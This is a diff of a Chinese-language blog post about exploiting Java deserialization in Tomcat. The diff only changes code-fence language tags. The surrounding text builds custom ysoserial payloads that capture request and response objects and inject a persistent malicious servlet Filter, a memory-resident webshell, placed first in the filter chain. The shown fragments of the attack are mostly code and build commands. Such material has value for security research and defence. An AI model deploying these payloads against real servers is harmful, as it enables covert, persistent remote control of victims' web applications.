@@ -108,7 +108,7 @@ private void internalDoFilter(ServletRequest request,
 
 首先，我们创建一个继承AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）的TomcatEchoInject类，在其静态代码块中`反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化`
 
-```text
+```java
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -174,7 +174,7 @@ public class TomcatEchoInject  extends AbstractTranslet {
 
 接着，我们改造一下ysoserial中的Gadgets.createTemplatesImpl方法
 
-```text
+```java
 public static Object createTemplatesImpl ( final String command) throws Exception {
     return createTemplatesImpl(command, null);
 }
@@ -238,7 +238,7 @@ public static <T> T createTemplatesImpl ( final String command, Class c, Class<T
 
 ysoserial.GeneratePayload\#main：
 
-```text
+```java
 if (args.length < 1) {
     printUsage();
     System.exit(USAGE_CODE);
@@ -247,13 +247,13 @@ if (args.length < 1) {
 
 在ysoserial执行maven指令生成jar包
 
-```text
+```java
 mvn clean -Dmaven.test.skip=true compile assembly:assembly
 ```
 
 这样，我们就能使用这个新的payload（CommonsCollections11ForTomcatEchoInject）了
 
-```text
+```bash
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject > ~/tmp/TomcatShellInject.ysoserial
 ```
 
@@ -261,7 +261,7 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInje
 
 在使用步骤一生成的序列化数据进行反序列化攻击后，我们就能通过下面这段代码获取到request和response对象了
 
-```text
+```java
 java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
 f.setAccessible(true);
 ThreadLocal t = (ThreadLocal) f.get(null);
@@ -271,7 +271,7 @@ ServletRequest servletRequest = (ServletRequest) t.get()
 
 接着，我们要做的就是动态注册Filter到tomcat中，参考[《动态注册之Servlet+Filter+Listener》](https://www.jianshu.com/p/cbe1c3174d41)，可以看到，其中通过ServletContext对象（实际获取的是ApplicationContext，是ServletContext的实现，因为门面模式的使用，后面需要提取实际实现），实现了动态注册Filter
 
-```text
+```java
 javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("threedr3am", threedr3am);
 filterRegistration.setInitParameter("encoding", "utf-8");
 filterRegistration.setAsyncSupported(false);
@@ -280,7 +280,7 @@ filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.D
 
 然而实际上并不管用，为什么呢？
 
-```text
+```java
 private Dynamic addFilter(String filterName, String filterClass, Filter filter) throws IllegalStateException {
     if (filterName != null && !filterName.equals("")) {
       if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) {
@@ -320,7 +320,7 @@ private Dynamic addFilter(String filterName, String filterClass, Filter filter) 
 
 跟进其实现方法，忽略不重要的代码：
 
-```text
+```java
 ...
 StandardContext context = (StandardContext) wrapper.getParent();
 FilterMap filterMaps[] = context.findFilterMaps();
@@ -349,14 +349,14 @@ for (int i = 0; i < filterMaps.length; i++) {
 
 这两个问题，也比较简单，第一个问题，其实在下面代码执行`filterRegistration.addMappingForUrlPatterns`的时候已经添加进去了
 
-```text
+```java
 javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("threedr3am", threedr3am);
 filterRegistration.setInitParameter("encoding", "utf-8");
 filterRegistration.setAsyncSupported(false);
 filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{"/*"});
 ```
 
-```text
+```java
 public void addMappingForUrlPatterns(EnumSet<DispatcherType> dispatcherTypes, boolean isMatchAfter, String... urlPatterns) {
     FilterMap filterMap = new FilterMap();
     filterMap.setFilterName(this.filterDef.getFilterName());
@@ -390,7 +390,7 @@ public void addMappingForUrlPatterns(EnumSet<DispatcherType> dispatcherTypes, bo
 
 而第二个问题，既然没有，我们就反射加进去就行了，不过且先看看StandardContext，它有一个方法`filterStart`
 
-```text
+```java
 public boolean filterStart() {
     if (this.getLogger().isDebugEnabled()) {
       this.getLogger().debug("Starting filters");
@@ -430,7 +430,7 @@ public boolean filterStart() {
 
 也简单，我们看回`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`的代码：
 
-```text
+```java
 // Add the relevant path-mapped filters to this filter chain
 for (int i = 0; i < filterMaps.length; i++) {
     if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
@@ -449,7 +449,7 @@ for (int i = 0; i < filterMaps.length; i++) {
 
 创建的顺序是根据filterMaps的顺序来的，那么我们就有必要去修改我们添加的filter顺序到第一位了，最后，整个第二步骤的代码如下：
 
-```text
+```java
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -596,13 +596,13 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
 
 通过执行maven打包
 
-```text
+```bash
 mvn clean -Dmaven.test.skip=true compile assembly:assembly
 ```
 
 然后执行生成的jar
 
-```text
+```bash
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatShellInject > ~/tmp/TomcatEchoInject.ysoserial
 ```
 
